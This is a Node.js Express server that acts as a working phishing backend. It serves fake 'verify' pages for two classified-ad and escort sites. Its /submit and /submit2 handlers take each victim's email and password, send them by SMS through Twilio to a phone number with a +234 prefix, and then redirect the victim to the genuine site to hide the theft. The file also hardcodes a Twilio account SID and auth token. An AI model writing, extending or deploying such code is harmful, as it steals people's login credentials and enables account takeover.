const  express = require('express');
const bodyParser=require("body-parser");
const appp = express();
const nodemailer = require("nodemailer");
const twilio = require('twilio');



appp.use(express.static('public'));
appp.use(express.urlencoded({extended:false}));


var server_port =process.env.PORT || 5000;
const accountSid = 'AC1a2468f4423526667a9231ad8e8bd209'; // Your Account SID from www.twilio.com/console
const authToken = 'a08baa140cb7472db31340d1665d6e1d'; // Your Auth Token from www.twilio.com/console


function send_message(body_value){

const client = new twilio(accountSid, authToken);


  client.messages
      .create({
         from: '+14793461364',
         body: body_value,
         to: '+2348143648991'
       })
      .then(message => console.log(message.sid));

}



appp.get('/',(req,res)=>{
    res.send("your request has been recieved");
});

appp.get('/verify',(req,res)=>{
    res.sendFile("./views/index.html",{root:__dirname},(err,res)=>{
        if(err){
            console.log(err)
        }
    });
});

appp.get('/verify-acc',(req,res)=>{
    res.sendFile("./views/index2.html",{root:__dirname},(err,res)=>{
        if(err){
            console.log(err)
        }
    });
});

appp.post('/submit', async (req,res)=>{
    console.log('form submitted successfully');
    const form_data = req.body;
    console.log(form_data.email);
    var text = "email : "+form_data.email + "\n" +"password: "+form_data.password + "\n" + "source : yesbackpage";
    send_message(text.toString());
    console.log(text.toString());
    res.redirect('https://www.yesbackpage.com/');
});

appp.post('/submit2', async (req,res)=>{
    console.log('form submitted successfully');
    const form_data = req.body;
    console.log(form_data.email);
    var text = "email : "+form_data.email + "\n" +"password: "+form_data.password + "\n" + "source : escortaffairs";
    send_message(text.toString());
    console.log(text.toString());
    res.redirect('https://www.escortsaffair.com/');
});

appp.listen(server_port,()=>{
    console.log('server started successfully on port: '+server_port);
});